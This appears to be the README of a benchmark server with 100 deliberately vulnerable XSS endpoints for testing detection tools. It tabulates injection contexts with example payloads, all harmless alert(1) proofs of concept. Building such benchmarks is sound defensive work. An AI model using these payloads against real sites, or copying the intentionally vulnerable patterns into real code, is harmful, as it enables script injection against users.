# XSS Benchmark

A Sinatra-based XSS vulnerability benchmark server for testing XSS detection tools.

## Overview

This server provides 100 different XSS vulnerable endpoints, each demonstrating a different XSS injection context. All endpoints use the GET method and accept a `query` parameter.

## Installation

```bash
bundle install
```

## Usage

```bash
bundle exec ruby app.rb
```

The server will start on `http://0.0.0.0:3000`.

## Endpoints

| Endpoint | XSS Context | Example Payload |
|----------|-------------|-----------------|
| GET /1?query= | HTML body | `<script>alert(1)</script>` |
| GET /2?query= | Unquoted attribute | `test onclick=alert(1)` |
| GET /3?query= | Single-quoted attribute | `' onclick='alert(1)` |
| GET /4?query= | Double-quoted attribute | `" onclick="alert(1)` |
| GET /5?query= | href attribute | `javascript:alert(1)` |
| GET /6?query= | Script (single quote) | `';alert(1);//` |
| GET /7?query= | Script (double quote) | `";alert(1);//` |
| GET /8?query= | onclick handler | `');alert(1);//` |
| GET /9?query= | img src | `x" onerror="alert(1)` |
| GET /10?query= | img onerror | `');alert(1);//` |
| GET /11?query= | style attribute | `red;background-image:url(javascript:alert(1))` |
| GET /12?query= | textarea | `</textarea><script>alert(1)</script>` |
| GET /13?query= | title tag | `</title><script>alert(1)</script>` |
| GET /14?query= | iframe src | `javascript:alert(1)` |
| GET /15?query= | SVG text | `<script>alert(1)</script>` |
| GET /16?query= | data attribute | `" onclick="alert(1)` |
| GET /17?query= | meta refresh | `0;url=javascript:alert(1)` |
| GET /18?query= | object data | `javascript:alert(1)` |
| GET /19?query= | embed src | `javascript:alert(1)` |
| GET /20?query= | form action | `javascript:alert(1)` |
| GET /21?query= | body onload | `');alert(1);//` |
| GET /22?query= | onmouseover handler | `');alert(1);//` |
| GET /23?query= | onfocus handler | `');alert(1);//` |
| GET /24?query= | oninput handler | `');alert(1);//` |
| GET /25?query= | onchange handler | `');alert(1);//` |
| GET /26?query= | JS template literal | `${alert(1)}` |
| GET /27?query= | innerHTML (DOM XSS) | `<img src=x onerror=alert(1)>` |
| GET /28?query= | document.write (DOM XSS) | `<script>alert(1)</script>` |
| GET /29?query= | HTML comment | `--><script>alert(1)</script><!--` |
| GET /30?query= | style tag | `red;}</style><script>alert(1)</script>` |
| GET /31?query= | base tag href | `javascript:alert(1)//` |
| GET /32?query= | link stylesheet | `javascript:alert(1)` |
| GET /33?query= | script src | `data:text/javascript,alert(1)` |
| GET /34?query= | img srcset | `x" onerror="alert(1)` |
| GET /35?query= | video poster | `javascript:alert(1)` |
| GET /36?query= | video src | `javascript:alert(1)` |
| GET /37?query= | audio src | `javascript:alert(1)` |
| GET /38?query= | source src | `javascript:alert(1)` |
| GET /39?query= | track src | `javascript:alert(1)` |
| GET /40?query= | formaction | `javascript:alert(1)` |
| GET /41?query= | iframe srcdoc | `<script>alert(1)</script>` |
| GET /42?query= | SVG onload | `');alert(1);//` |
| GET /43?query= | SVG href | `javascript:alert(1)` |
| GET /44?query= | MathML | `<script>alert(1)</script>` |
| GET /45?query= | details ontoggle | `');alert(1);//` |
| GET /46?query= | marquee onstart | `');alert(1);//` |
| GET /47?query= | contenteditable onfocus | `');alert(1);//` |
| GET /48?query= | autofocus onfocus | `');alert(1);//` |
| GET /49?query= | JSON context | `"};alert(1);//` |
| GET /50?query= | noscript tag | `</noscript><script>alert(1)</script>` |
| GET /51?query= | URL fragment (DOM XSS) | `<img src=x onerror=alert(1)>` |
| GET /52?query= | window.name (DOM XSS) | `<img src=x onerror=alert(1)>` |
| GET /53?query= | location.search (DOM XSS) | `<img src=x onerror=alert(1)>` |
| GET /54?query= | CSS @import url | `);@import url(javascript:alert(1))` |
| GET /55?query= | setTimeout string | `");alert(1);//` |
| GET /56?query= | setInterval string | `");alert(1);//` |
| GET /57?query= | eval context | `");alert(1);//` |
| GET /58?query= | Function constructor | `");alert(1);//` |
| GET /59?query= | postMessage handler | `<img src=x onerror=alert(1)>` |
| GET /60?query= | document.cookie | `';alert(1);//` |
| GET /61?query= | localStorage | `';alert(1);</script><script>alert(1)//` |
| GET /62?query= | sessionStorage | `';alert(1);</script><script>alert(1)//` |
| GET /63?query= | XMLHttpRequest open URL | `javascript:alert(1)` |
| GET /64?query= | fetch URL | `javascript:alert(1)` |
| GET /65?query= | Worker URL | `data:text/javascript,alert(1)` |
| GET /66?query= | SharedWorker URL | `data:text/javascript,alert(1)` |
| GET /67?query= | aria-label attribute | `" onclick="alert(1)` |
| GET /68?query= | input placeholder | `" onfocus="alert(1)" autofocus="` |
| GET /69?query= | img alt attribute | `" onerror="alert(1)` |
| GET /70?query= | button type attribute | `submit" onclick="alert(1)` |
| GET /71?query= | input type attribute | `text" onfocus="alert(1)" autofocus="` |
| GET /72?query= | body background (legacy) | `javascript:alert(1)` |
| GET /73?query= | table background (legacy) | `javascript:alert(1)` |
| GET /74?query= | td background (legacy) | `javascript:alert(1)` |
| GET /75?query= | bgsound src (legacy IE) | `javascript:alert(1)` |
| GET /76?query= | layer src (legacy) | `javascript:alert(1)` |
| GET /77?query= | input formmethod | `GET" onclick="alert(1)` |
| GET /78?query= | input formenctype | `text/plain" onclick="alert(1)` |
| GET /79?query= | input formtarget | `_blank" onclick="alert(1)` |
| GET /80?query= | a target attribute | `_blank" onclick="alert(1)` |
| GET /81?query= | a download attribute | `test" onclick="alert(1)` |
| GET /82?query= | area href | `javascript:alert(1)` |
| GET /83?query= | blockquote cite | `" onclick="alert(1)` |
| GET /84?query= | q cite attribute | `" onclick="alert(1)` |
| GET /85?query= | ins cite attribute | `" onclick="alert(1)` |
| GET /86?query= | del cite attribute | `" onclick="alert(1)` |
| GET /87?query= | applet codebase (legacy) | `javascript:alert(1)` |
| GET /88?query= | applet code (legacy) | `javascript:alert(1)` |
| GET /89?query= | object codebase | `javascript:alert(1)` |
| GET /90?query= | object classid | `javascript:alert(1)` |
| GET /91?query= | param value | `javascript:alert(1)` |
| GET /92?query= | XML data island | `</item></xml><script>alert(1)</script>` |
| GET /93?query= | xmp tag (deprecated) | `</xmp><script>alert(1)</script>` |
| GET /94?query= | listing tag (deprecated) | `</listing><script>alert(1)</script>` |
| GET /95?query= | plaintext tag | N/A (renders all as text) |
| GET /96?query= | isindex prompt (deprecated) | `" onclick="alert(1)` |
| GET /97?query= | frameset onload (legacy) | `');alert(1);//` |
| GET /98?query= | frame src (legacy) | `javascript:alert(1)` |
| GET /99?query= | keygen autofocus (deprecated) | `');alert(1);//` |
| GET /100?query= | menu item onclick | `');alert(1);//` |

## License

MIT License